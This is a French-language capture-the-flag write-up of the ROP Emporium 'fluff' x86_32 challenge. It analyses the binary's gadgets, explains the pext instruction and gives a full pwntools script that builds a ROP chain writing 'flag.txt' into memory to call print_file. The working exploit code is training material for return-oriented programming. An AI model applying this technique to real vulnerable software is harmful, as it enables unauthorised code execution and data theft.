---
Title: Ropemporium x86_32 fluff
Date: 2023-06-16
Tags: [linux, pwn, python, ROP, x86_32, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# fluff

## Introduction

Le challenge est décrit ainsi sur le site [ropemporium](https://ropemporium.com/challenge/fluff.html)

Working backwards

Once we've employed our usual drills of checking protections and searching for interesting symbols & strings, we can think about what we're trying to acheive and plan our chain. A solid approach is to work backwards: we'll need a write gadget - for example mov [reg], reg or something equivalent - to make the actual write, so we can start there.
Do it!

There's not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes we'll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. If you're using a gadget finder like ropper, you may need to tell it to search for longer gadgets. As usual, you'll need to call the print_file() function with a path to the flag as its only argument. Some useful(?) gadgets are available at the questionableGadgets symbol.

## Découvert

### Contenu du challenge

    -rw-r--r-- 1 1000 1000   33 Jul 15  2020 flag.txt
    -rwxr-xr-x 1 1000 1000 7256 Jul 15  2020 fluff32
    -rwxr-xr-x 1 1000 1000 7212 Jul 15  2020 libfluff32.so

Le challenge contien un executable, une librairie et le fichier flag.txt

### Execution

    06_fluff# ./fluff
    fluff by ROP Emporium
    x86_64

    You know changing these strings means I have to rewrite my solutions...
    > OK
    Thank you!

### Protections

    gef➤  checksec
    [+] checksec for '/w/ropemporium/x32/06_fluff/fluff32'
    Canary                        : ✘
    NX                            : ✓
    PIE                           : ✘
    Fortify                       : ✘
    RelRO                         : Partial


## Analyse

### Le programme fluff

La fonction main appelle la fonction vulnérable `pwnme` qui est importée donc la la librairie.so.

    [0x080483f0]> pdf @sym.main
                ; DATA XREFS from entry0 @ 0x8048416, 0x804841c
    ┌ 36: int main (char **argv);
    │           ; arg char **argv @ esp+0x14
    │           0x08048506      8d4c2404       lea ecx, [argv]
    │           0x0804850a      83e4f0         and esp, 0xfffffff0
    │           0x0804850d      ff71fc         push dword [ecx - 4]
    │           0x08048510      55             push ebp
    │           0x08048511      89e5           mov ebp, esp
    │           0x08048513      51             push ecx
    │           0x08048514      83ec04         sub esp, 4
    │           0x08048517      e894feffff     call sym.imp.pwnme
    │           0x0804851c      b800000000     mov eax, 0
    │           0x08048521      83c404         add esp, 4
    │           0x08048524      59             pop ecx
    │           0x08048525      5d             pop ebp
    │           0x08048526      8d61fc         lea esp, [ecx - 4]
    └           0x08048529      c3             ret

Comme write4, il existe une fonction qui appelle une fonction `print_file` située dans le librairie.

    [0x080483f0]> pdf @sym.usefulFunction
    ┌ 25: sym.usefulFunction ();
    │           0x0804852a      55             push ebp
    │           0x0804852b      89e5           mov ebp, esp
    │           0x0804852d      83ec08         sub esp, 8
    │           0x08048530      83ec0c         sub esp, 0xc
    │           0x08048533      68e0850408     push str.nonexistent        ; 0x80485e0 ; "nonexistent"
    │           0x08048538      e893feffff     call sym.imp.print_file
    │           0x0804853d      83c410         add esp, 0x10
    │           0x08048540      90             nop
    │           0x08048541      c9             leave
    └           0x08048542      c3             ret

On note que call de print_file est situé en usefulFunction + 14 .

Le programme ne contient pas de chaine "flag.txt".

On ne trouve pas non plus de gadget de type "mov [exx]" qui permttrait d'ecrire en mémoire.

Avec radar2 on fouille à la recherche d'indice.

    [0x08047ffa]> f~Gadget
    0x08048543 0 loc.questionableGadgets

Comme dans la version x64 de fluff on trouve des gadgets intéressants dan cette section.

    [0x08047ffa]> pd 10 @ loc.questionableGadgets
            ;-- questionableGadgets:
            0x08048543      89e8           mov eax, ebp
            0x08048545      bbbababab0     mov ebx, 0xb0bababa
            0x0804854a      c4e262f5d0     pext edx, ebx, eax
            0x0804854f      b8efbeadde     mov eax, 0xdeadbeef
            0x08048554      c3             ret
            0x08048555      8611           xchg byte [ecx], dl
            0x08048557      c3             ret
            0x08048558      59             pop ecx
            0x08048559      0fc9           bswap ecx
            0x0804855b      c3             ret

- xchg byte [ecx], dl

Echange le contenu du bytes adressé par le contenu de `ecx` et le contenu de `dl`.
On rappelle que `dl` est l'octat de poid faible de `edx`.
Il nous permet donc d'ecrire un byte en memoire.
Mais nous devons maitriser `edx` et `ecx`.

- pop ecx; bswap ecx; ret
Permet de charger ecx. bswap ecx inverse ensuite l'ordre de bytes.
Nous donne donc le controle de ecx. Il faudra juste inverser le bytes.

Il nous reste encore a contrôler `edx`.

- le gadget pext.

Que fait l'instruction pext. (Parallel Bits Extract)

    PEXT r32dst, r32src, r32mask

Extrait les bits à 1 dans r32mask de r32src et les écrit dans r32src en parallèle donc dans le même ordre, et cadré à droite.

Par ex (sur 16 bits).

    source 1111001111010101
    mask   0011111100111001
            ||||||  |||  |
            110011  010  1
            ==> 1100110101
    dest.  0000001100110101

Usage du gadget.

            0x08048543      89e8           mov eax, ebp
            0x08048545      bbbababab0     mov ebx, 0xb0bababa
            0x0804854a      c4e262f5d0     pext edx, ebx, eax

On ne maitrise pas la source mais le masque.
Moyenant le chargement de `eax` via `ebp`.
On a ce qu'il faut :

    0x080485bb  pop ebp; ret

La source est fixée : 0xb0bababa

Notre but n'est pas de charger `edx` mais `dl`

Par exemple pout obtenir 'f' dans `dl`

    >>> bin(0xbaba)
    '0b1011101010111010'
    >>> bin(ord('f'))
    '0b1100110'

En partant des bits de poids faible on recherche dans la source les bits correspondants au resultat qu'on veut obtenir

baba:  1011101010111010
"f"        1 10 0  1 10
masque 0000101101001011

La fonction python suivante effectue ce calcul.

```python
def calc_pext_mask(src, dest):
    mask=0
    bmask=1
    while dest:
        if dest&1 == src&1:
            mask=mask | bmask
            dest>>=1
            print(bin(mask)[2:])
        src>>=1
        bmask<<=1
    return mask

m = calc_pext_mask(0xb0bababa,ord('f'))
print("mask=",bin(m)[2:])
```
On obtient le resultat attendu pour 'f'

    1
    11
    1011
    1001011
    101001011
    1101001011
    101101001011
    mask= 101101001011

## Construction de l'attaque

### Synoptique de la chaine de ROP

Pour ecrire 'f' dans data :
- pop ebp pour charger le masque pext de 'f'
- mask('f') : 0xb4b
- gadget pext : edx = 0x66
- pop ecx; bswap ecx; ret ; charge ecx avec l'adresse cible
- swap(@data) : adresse cible en big endian
- xchg byte [ecx], dl => ecriture du caractère

On dont donc itérer sur chaque caractère de 'flag.txt' pour écrire data .data.

Et le synoptic global :

- Pour chaque byte de 'flag.txt':
    - Ropchaine d'ecriture pour @data+index du byte
- usefulFunction+14 pour "call print_file"
- @data



### Script python


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break ret de pwnme
gs='''
b *pwnme+177
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('fluff32')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

def pext_mask(src, dest):
    mask=0
    bmask=1
    while dest:
        if dest&1 == src&1:
            mask=mask | bmask
            dest>>=1
            # print(bin(mask)[2:])
        src>>=1
        bmask<<=1
    return mask

usefulFunction=elf.symbols['usefulFunction']
print_file=usefulFunction+12

# ----- Gadgets -----
# mov eax, ebp
# mov ebx, 0xb0bababa
# pext edx, ebx, eax
# mov eax, 0xdeadbeef
# ret
g_pext = 0x08048543

# 0x08048543 : mov dword ptr [edi], ebp ; ret
g_write = 0x08048543

# pop ecx; bswap ecx; ret
g_pop_bswap_ecx=0x08048558

# xchg byte [ecx], dl; ret
g_xchg_ecx=0x08048555

# pop ebp; ret
g_pop_ebp = 0x080485bb

# .data section
data = elf.get_section_by_name('.data').header['sh_addr']

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

PL =b"A"*offset

for i, c in enumerate(b'flag.txt'):
    PL+=p32(g_pop_ebp)
    PL+=p32(pext_mask(0xb0bababa,c))
    PL+=p32(g_pext)
    PL+=p32(g_pop_bswap_ecx)
    PL+=p32(data+i, endianness="big")
    PL+=p32(g_xchg_ecx)

PL+=p32(print_file)
PL+=p32(data)

io.sendline(PL)
io.interactive()
```

### Execution

Execution du scipt python :

    06_fluff# vi solve.py

    [*] '/w/ropemporium/x32/06_fluff/fluff32'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
        RUNPATH:  b'.'
    [+] Starting local process '/w/ropemporium/x32/06_fluff/fluff32': pid 124

      [*] Switching to interactive mode
    fluff by ROP Emporium
    x86

    You know changing these strings means I have to rewrite my solutions...
    > Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive

